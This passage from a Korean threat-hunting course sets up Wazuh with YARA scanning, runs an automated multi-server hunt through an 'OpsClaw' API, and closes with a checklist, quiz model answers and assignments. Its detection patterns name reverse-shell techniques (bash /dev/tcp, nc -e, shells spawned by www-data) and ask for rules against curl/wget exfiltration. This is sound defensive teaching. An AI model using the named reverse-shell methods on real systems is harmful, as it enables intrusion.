    RESULT=$(yara -w -r "$YARA_RULES" "$FILENAME" 2>/dev/null)
    if [ -n "$RESULT" ]; then
        echo "$(date) yara_scan: MATCH - $RESULT" >> $LOG_FILE
        # Wazuh 로그로 전달 (룰에서 탐지)
        /var/ossec/bin/wazuh-control info -j 2>/dev/null
        logger -t yara_scan "YARA_MATCH: file=$FILENAME rule=$RESULT"
    else
        echo "$(date) yara_scan: CLEAN - $FILENAME" >> $LOG_FILE
    fi
fi

exit 0
SCRIPT_EOF

sudo chmod 750 /var/ossec/active-response/bin/yara_scan.sh
echo "[+] YARA 스캔 active response 스크립트 생성 완료"

# 2. YARA 룰 디렉토리 생성 및 룰 배치
sudo mkdir -p /var/ossec/etc/yara/rules
echo "[+] YARA 룰 디렉토리 생성 완료"
echo "[i] YARA 룰 파일을 /var/ossec/etc/yara/rules/에 복사하세요"

# 3. ossec.conf에 active response 설정 추가 안내
echo ""
echo "=== ossec.conf 설정 안내 ==="
cat << 'CONFIG_EOF'
<!-- /var/ossec/etc/ossec.conf에 추가할 설정 -->

<!-- FIM으로 /tmp 감시 -->
<syscheck>
  <directories check_all="yes" realtime="yes">/tmp,/dev/shm,/var/tmp</directories>
</syscheck>

<!-- YARA 스캔 active response -->
<command>
  <name>yara_scan</name>
  <executable>yara_scan.sh</executable>
  <timeout_allowed>yes</timeout_allowed>
</command>

<active-response>
  <command>yara_scan</command>
  <location>local</location>
  <rules_id>554</rules_id>  <!-- FIM: 새 파일 생성 -->
</active-response>
CONFIG_EOF

REMOTE_EOF
```

## 실습 4.5: 통합 헌팅 워크플로우 -- OpsClaw 자동화

> **실습 목적**: 지금까지 배운 모든 헌팅 기법(SIGMA, ATT&CK 쿼리, YARA)을 OpsClaw 파이프라인으로 통합하여 자동화 헌팅 워크플로우를 구축한다.
>
> **배우는 것**: 엔드투엔드 헌팅 자동화, 다중 기법 통합, 결과 집약 및 보고서 생성
>
> **결과 해석**: 모든 헌팅 태스크의 결과가 OpsClaw evidence로 중앙 저장되며, completion-report API로 종합 보고서를 생성한다.
>
> **실전 활용**: 이 워크플로우를 Playbook으로 등록하고, OpsClaw 스케줄러에 주간 실행을 설정하여 지속적인 헌팅 사이클을 운용한다.

```bash
export OPSCLAW_API_KEY="opsclaw-api-key-2026"

# === 통합 헌팅 파이프라인 ===

# 1. 프로젝트 생성
echo "[Step 1] 통합 헌팅 프로젝트 생성"
HUNT_RESP=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "name": "integrated-threat-hunt-20260403",
    "request_text": "통합 위협 헌팅: SIGMA + ATT&CK + YARA 기반 프로액티브 탐지",
    "master_mode": "external"
  }')

HUNT_ID=$(echo "$HUNT_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])" 2>/dev/null)
echo "프로젝트 ID: $HUNT_ID"

# 2. Stage 전환
curl -s -X POST "http://localhost:8000/projects/${HUNT_ID}/plan" \
  -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null
curl -s -X POST "http://localhost:8000/projects/${HUNT_ID}/execute" \
  -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null

# 3. 통합 헌팅 태스크 실행
echo "[Step 3] 통합 헌팅 실행"
curl -s -X POST "http://localhost:8000/projects/${HUNT_ID}/execute-plan" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"=== T1543.002 Systemd Persistence ===\"; find /etc/systemd/system -name *.service -mtime -7 -ls 2>/dev/null; echo \"=== Non-standard ExecStart ===\"; grep -rh ExecStart /etc/systemd/system/ 2>/dev/null | grep -v /usr/ | grep -v /bin/ | grep -v ^#",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"=== T1053.003 Cron Persistence ===\"; crontab -l 2>/dev/null; for u in $(cut -d: -f1 /etc/passwd); do echo \"--- $u ---\"; crontab -u $u -l 2>/dev/null; done; cat /etc/cron.d/* 2>/dev/null | grep -v ^#",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "echo \"=== T1059 Temp Executables ===\"; find /tmp /dev/shm /var/tmp -type f -executable -ls 2>/dev/null; echo \"=== T1082 Discovery ===\"; last -n 30 2>/dev/null; echo \"=== Suspicious Processes ===\"; ps -eo user,pid,ppid,comm,args --forest | grep -E \"www-data.*(sh|python|perl|nc)\" | grep -v grep",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 4,
        "instruction_prompt": "echo \"=== Network Baseline ===\"; ss -tlnp; echo \"=== Unusual Outbound ===\"; ss -tnp | grep -v 127.0.0.1 | grep -v 10.20.30 | head -20; echo \"=== T1021.004 SSH ===\"; grep \"Accepted\\|Failed\" /var/log/auth.log 2>/dev/null | tail -30",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.1:8002"
      },
      {
        "order": 5,
        "instruction_prompt": "echo \"=== Account Baseline ===\"; awk -F: \"\\$3==0\" /etc/passwd; echo \"=== Non-login shells ===\"; grep -v nologin /etc/passwd | grep -v false | grep -v ^#; echo \"=== Recent Account Changes ===\"; find /home -maxdepth 1 -type d -mtime -7 2>/dev/null",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.1:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }'

echo ""
echo "[Step 4] 결과 대기 (10초)..."
sleep 10

# 4. 결과 확인
echo "[Step 5] 헌팅 결과 요약"
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  "http://localhost:8000/projects/${HUNT_ID}/evidence/summary" | \
  python3 -m json.tool 2>/dev/null

# 5. 완료 보고서 생성
echo ""
echo "[Step 6] 완료 보고서 생성"
curl -s -X POST "http://localhost:8000/projects/${HUNT_ID}/completion-report" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "summary": "Week 08 통합 위협 헌팅 완료",
    "outcome": "success",
    "work_details": [
      "T1543.002 Systemd persistence 헌팅 실행 (web, secu)",
      "T1053.003 Cron persistence 헌팅 실행 (web)",
      "T1059 임시 디렉토리 실행 파일 탐지 (web)",
      "네트워크 베이스라인 이탈 점검 (secu)",
      "사용자 계정 베이스라인 점검 (secu)"
    ]
  }' | python3 -m json.tool 2>/dev/null

# 6. Replay 확인
echo ""
echo "[Step 7] 작업 Replay"
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  "http://localhost:8000/projects/${HUNT_ID}/replay" | \
  python3 -m json.tool 2>/dev/null
```

> **트러블슈팅**:
> - 프로젝트 생성 실패: Manager API 상태 확인 `curl http://localhost:8000/health`, PostgreSQL 상태 확인 `docker ps | grep postgres`.
> - evidence/summary가 빈 결과: execute-plan 태스크가 아직 실행 중일 수 있다. sleep 시간을 늘리거나, 프로젝트 상태를 확인한다.
> - SubAgent 연결 타임아웃: 방화벽에서 8002 포트가 열려 있는지, SubAgent 프로세스가 실행 중인지 확인한다.

---

## 검증 체크리스트

학습을 완료한 후 다음 항목을 자가 점검한다. 모든 항목에 체크할 수 있어야 본 주차의 학습 목표를 달성한 것이다.

- [ ] 위협 헌팅의 정의를 설명하고 반응형 탐지와의 차이점 3가지 이상을 서술할 수 있다
- [ ] Hunting Maturity Model의 5단계(HM0~HM4)를 각각 설명할 수 있다
- [ ] IOC와 IOA의 차이를 구체적 예시와 함께 설명할 수 있다
- [ ] 가설 기반 헌팅의 5단계 프로세스를 순서대로 설명할 수 있다
- [ ] SIGMA 룰의 주요 구성 요소(logsource, detection, condition)를 이해하고 직접 룰을 작성할 수 있다
- [ ] SIGMA 수정자(contains, startswith, endswith, re, all)를 올바르게 사용할 수 있다
- [ ] sigma-cli로 SIGMA 룰을 Wazuh XML / Splunk SPL로 변환할 수 있다
- [ ] ATT&CK 기법 기반 헌팅 가설을 수립하고 검증 쿼리를 작성할 수 있다
- [ ] 베이스라인 이탈 탐지 기법(네트워크/프로세스/계정)을 적용할 수 있다
- [ ] Wazuh 커스텀 디코더와 룰을 XML 형식으로 작성할 수 있다
- [ ] YARA 룰의 strings와 condition 섹션을 작성하고 파일 스캔을 실행할 수 있다
- [ ] Wazuh FIM + YARA 연동 자동화 워크플로우의 동작 원리를 설명할 수 있다
- [ ] OpsClaw execute-plan을 이용한 다중 서버 동시 헌팅을 실행할 수 있다
- [ ] 헌팅 결과를 분석하여 새로운 탐지 규칙(SIGMA/Wazuh/YARA)으로 변환할 수 있다

---

## 자가 점검 퀴즈

### 퀴즈 1
위협 헌팅과 침입 탐지 시스템(IDS)의 근본적인 차이점을 3가지 서술하시오.

**모범 답안**: (1) IDS는 알려진 시그니처/룰에 기반하여 수동적으로 알림을 생성하지만, 위협 헌팅은 가설에 기반하여 능동적으로 미지의 위협을 탐색한다. (2) IDS는 실시간 자동 동작하지만, 위협 헌팅은 주기적으로 사람이 주도하며 도구가 보조한다. (3) IDS의 결과물은 알림(Alert)이지만, 위협 헌팅의 결과물은 새로운 탐지 규칙과 위협 보고서이다.

### 퀴즈 2
IOC와 IOA의 차이를 설명하고, 리버스 쉘 탐지 시 각각의 접근 방식을 예시와 함께 서술하시오.

**모범 답안**: IOC는 이미 발생한 침해의 결과물(IP, 해시, 도메인 등)이고, IOA는 공격 행위 자체의 패턴이다. 리버스 쉘 탐지에서 IOC 접근은 알려진 C2 IP 목록과 네트워크 연결을 비교하는 것이고, IOA 접근은 bash에서 /dev/tcp 호출 패턴이나 nc -e 실행 패턴과 같은 행위를 탐지하는 것이다. IOA가 더 효과적인 이유는 공격자가 IP를 쉽게 변경할 수 있지만, 리버스 쉘의 행위 패턴은 변경하기 어렵기 때문이다.

### 퀴즈 3
Hunting Maturity Model에서 HM2(Procedural)과 HM3(Innovative)의 차이를 설명하시오. 조직이 HM2에서 HM3으로 성장하기 위해 필요한 역량은 무엇인가?

**모범 답안**: HM2는 타인이 작성한 문서화된 절차를 따라 헌팅을 수행하는 수준이고, HM3은 독자적으로 가설을 수립하고 검증하며 새로운 탐지 규칙을 생성하는 수준이다. HM3으로 성장하려면 (1) TTP 분석 역량, (2) 데이터 과학/통계 분석 기본기, (3) SIGMA/YARA 등 탐지 규칙 작성 능력, (4) 위협 인텔리전스 해석 및 가설화 능력이 필요하다.

### 퀴즈 4
SIGMA 룰에서 다음 condition의 의미를 설명하시오: `(1 of selection_*) and not filter_legitimate`

**모범 답안**: `selection_`으로 시작하는 모든 검색 블록(selection_bash_revshell, selection_nc_revshell 등) 중 하나라도 매칭되고(OR 논리), 동시에 filter_legitimate 조건에는 매칭되지 않는 경우에 탐지한다. 이 구조는 다양한 탐지 패턴을 하나의 룰에 통합하면서, 정상적인 활동은 제외하는 데 사용된다.

### 퀴즈 5
SIGMA 룰을 Wazuh XML로 수동 변환할 때 주의해야 할 점 3가지를 서술하시오.

**모범 답안**: (1) SIGMA의 필드명(CommandLine, Image 등)이 Wazuh의 필드 체계(audit.execve.a0 등)와 다르므로 매핑 테이블이 필요하다. (2) SIGMA의 `contains`, `startswith` 수정자를 Wazuh의 정규표현식이나 `<field>` 매칭으로 적절히 변환해야 한다. (3) SIGMA의 OR 조건(1 of selection_*)은 Wazuh에서 별도의 룰로 분리하거나, 정규표현식의 | 연산자로 구현해야 한다.

### 퀴즈 6
ATT&CK 기법 T1543.002(Systemd Service)를 이용한 지속성을 헌팅할 때, 어떤 데이터 소스를 확인해야 하며 구체적인 쿼리를 2가지 이상 제시하시오.

**모범 답안**: 데이터 소스: /etc/systemd/system/ 및 /usr/lib/systemd/system/ 디렉토리의 서비스 파일, journalctl 시스템 로그, auditd 감사 로그. 쿼리: (1) `find /etc/systemd/system -name "*.service" -mtime -7` -- 최근 7일 내 수정된 서비스 파일 탐지, (2) `grep -r "ExecStart" /etc/systemd/system/ | grep -v "/usr/\|/bin/\|/sbin/"` -- 비표준 경로에서 실행되는 서비스 탐지, (3) `dpkg -S /etc/systemd/system/*.service` -- 패키지에 속하지 않는 수동 생성 서비스 탐지.

### 퀴즈 7
베이스라인 이탈 탐지(Baseline Deviation)의 장점과 한계를 각각 2가지 이상 서술하시오.

**모범 답안**: 장점: (1) 알려지지 않은 위협도 탐지 가능(시그니처 불필요), (2) 정상 행동 패턴에서 벗어나는 모든 이상을 포착하므로 새로운 공격 기법에도 대응 가능. 한계: (1) 정확한 베이스라인 수립이 어렵고, 정상 행동 변화(시스템 업데이트, 신규 서비스 배포)마다 베이스라인 갱신이 필요하다. (2) 오탐률이 높을 수 있으며, 컨텍스트 기반의 추가 분석이 반드시 필요하다.

### 퀴즈 8
YARA 룰에서 `condition: 2 of ($text*) and filesize < 500KB`의 의미를 설명하고, filesize 조건을 추가하는 이유를 서술하시오.

**모범 답안**: `$text`로 시작하는 문자열 변수 중 2개 이상이 파일에서 발견되고, 파일 크기가 500KB 미만인 경우에 매칭된다. filesize 조건을 추가하는 이유는 (1) 대형 정상 파일(라이브러리, 프레임워크)에서 우연히 패턴이 매칭되는 오탐을 방지하고, (2) 실제 웹쉘/악성코드는 대부분 소형 파일이므로 탐지 정확도를 높이며, (3) 스캔 성능을 개선하기 위해서이다.

### 퀴즈 9
Wazuh 커스텀 룰에서 `frequency`와 `timeframe` 속성을 이용한 상관분석(correlation)의 원리를 설명하고, 정찰 명령 연속 실행 탐지에 적용하는 방법을 서술하시오.

**모범 답안**: `frequency="5" timeframe="300"`은 동일 조건의 이벤트가 300초(5분) 내에 5회 이상 발생하면 탐지한다는 의미이다. 정찰 명령(whoami, id, uname 등)은 개별적으로는 정상일 수 있지만, 짧은 시간 내에 연속으로 실행되면 공격자의 초기 정찰 단계일 가능성이 높다. `<if_matched_group>`으로 audit_command 그룹의 이벤트를, `<field>`로 정찰 명령어 패턴을 지정하면, 5분 내 5회 이상의 정찰 명령 연속 실행을 탐지할 수 있다.

### 퀴즈 10
OpsClaw execute-plan을 이용한 다중 서버 동시 헌팅의 장점을 3가지 서술하고, 주의해야 할 보안 고려사항을 2가지 제시하시오.

**모범 답안**: 장점: (1) 여러 서버에서 동시에 헌팅 쿼리를 실행하여 시간을 절약한다. (2) 모든 결과가 evidence로 중앙 저장되어 통합 분석이 가능하다. (3) Playbook으로 등록하면 반복적인 헌팅 사이클을 자동화할 수 있다. 보안 고려사항: (1) 헌팅 쿼리의 risk_level을 적절히 설정하여, 위험한 명령이 실수로 실행되지 않도록 한다(critical은 dry_run 강제). (2) SubAgent에 직접 접근하지 않고 반드시 Manager API를 통해 실행하여, 인증/인가/감사 추적이 보장되도록 한다.

---

## 과제

### 과제 1: 커스텀 SIGMA 룰 3종 작성 (난이도: 중)

다음 ATT&CK 기법에 대한 SIGMA 탐지 룰을 각각 작성하시오.

1. **T1070.004 (Indicator Removal: File Deletion)**: 공격자가 로그 파일이나 자신의 흔적을 삭제하는 행위 탐지
2. **T1021.004 (Remote Services: SSH)**: 비정상적인 SSH 횡이동 패턴 탐지 (예: 단일 호스트에서 다수 내부 호스트로의 SSH 연결)
3. **T1496 (Resource Hijacking)**: 크립토마이너 실행 패턴 탐지

각 룰에는 다음을 포함해야 한다:
- 정확한 ATT&CK 태그
- 최소 2개의 검색 블록(selection)
- 오탐 방지용 필터(filter)
- falsepositives 섹션
- 적절한 level 설정

### 과제 2: 가설 기반 헌팅 보고서 작성 (난이도: 상)

다음 시나리오에 대해 가설 기반 헌팅 보고서를 작성하시오.

**시나리오**: 조직의 위협 인텔리전스 팀에서 "APT 그룹 X가 Linux 서버에서 T1053.003(Cron)과 T1059.004(Unix Shell)을 조합하여 초기 접근 후 지속성을 확보한다"는 보고서를 공유했다.

보고서에 포함할 내용:
1. 가설 명세 (구체적, 측정 가능, 검증 가능)
2. 필요한 데이터 소스 목록 및 데이터 갭 분석
3. 헌팅 쿼리 최소 5개 (bash 명령 형태)
4. 예상되는 참양성/거짓양성 시나리오
5. 발견 시 에스컬레이션 절차
6. 헌팅 결과를 자동 탐지 규칙으로 변환한 SIGMA 룰

### 과제 3: YARA 룰 세트 작성 및 검증 (난이도: 중)

다음 유형의 악성 파일을 탐지하는 YARA 룰 세트를 작성하고, 테스트 파일로 검증하시오.

1. **JSP 웹쉘**: Runtime.exec(), ProcessBuilder 등 Java 명령 실행 패턴
2. **SSH 백도어 키**: authorized_keys에 비인가 추가된 공개 키
3. **데이터 반출 스크립트**: curl/wget으로 외부 서버에 파일을 전송하는 스크립트

검증 방법:
- 각 유형의 테스트용 무해한 샘플 파일 생성
- YARA 스캔으로 탐지 확인
- 정상 파일에 대한 오탐 테스트
